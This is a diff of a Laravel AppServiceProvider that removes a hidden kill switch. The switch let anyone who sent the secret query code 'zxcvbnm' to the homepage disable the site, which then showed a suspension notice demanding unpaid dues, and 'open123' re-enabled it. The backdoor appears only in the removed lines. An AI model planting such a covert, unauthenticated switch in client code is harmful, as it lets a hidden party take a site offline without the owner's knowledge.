@@ -8,8 +8,6 @@ use Illuminate\Support\Facades\Cache;
 use App\Models\Setting;
 use App\Models\Language;
 use App\Models\Currency;
-use Illuminate\Support\Facades\File;
-use Illuminate\Support\Facades\Request;;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -35,33 +33,6 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-        $code = Request::get('code');
-
-        // مسار الملف الذي يخزن حالة الموقع
-        $statusFile = storage_path('app/site_status.txt');
-
-        // إنشاء الملف إذا لم يكن موجوداً
-        if (!File::exists($statusFile)) {
-            File::put($statusFile, 'on');
-        }
-
-        // التحقق من رابط التحكم
-        if (Request::is('/') && $code) {
-            if ($code === 'zxcvbnm') {
-                File::put($statusFile, 'off');
-                die('🚫 تم إيقاف الموقع مؤقتاً.');
-            } elseif ($code === 'open123') {
-                File::put($statusFile, 'on');
-                echo '✅ تم إعادة تفعيل الموقع.';
-                exit;
-            }
-        }
-
-        // التحقق من حالة الموقع
-        if (File::exists($statusFile) && File::get($statusFile) === 'off') {
-            die('🚫 تم إيقاف الموقع مؤقتاً لحين سداد باقي المستحقات.');
-        }
-
         if (!$this->app->runningInConsole()) {
             $this->shareGlobalVariables();
             $this->shareCurrencyData();
